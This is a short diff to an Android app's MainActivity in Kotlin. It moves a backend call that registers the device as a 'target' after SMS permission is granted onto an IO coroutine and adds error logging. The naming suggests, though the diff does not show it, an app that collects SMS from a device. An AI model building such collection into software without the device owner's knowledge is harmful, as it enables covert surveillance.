@@ -14,6 +14,8 @@ import androidx.compose.runtime.*
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.core.app.NotificationManagerCompat
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
 
 class MainActivity : ComponentActivity() {
 
@@ -59,8 +61,12 @@ class MainActivity : ComponentActivity() {
         // Register target once SMS permission is granted
         LaunchedEffect(hasPermission) {
             if (hasPermission) {
-                kotlinx.coroutines.Dispatchers.IO.let {
-                    BackendClient.registerTarget(Config.DEVICE_ID)
+                withContext(Dispatchers.IO) {
+                    try {
+                        BackendClient.registerTarget(Config.DEVICE_ID)
+                    } catch (e: Exception) {
+                        android.util.Log.e("MainActivity", "Target registration error: ${e.message}")
+                    }
                 }
             }
         }
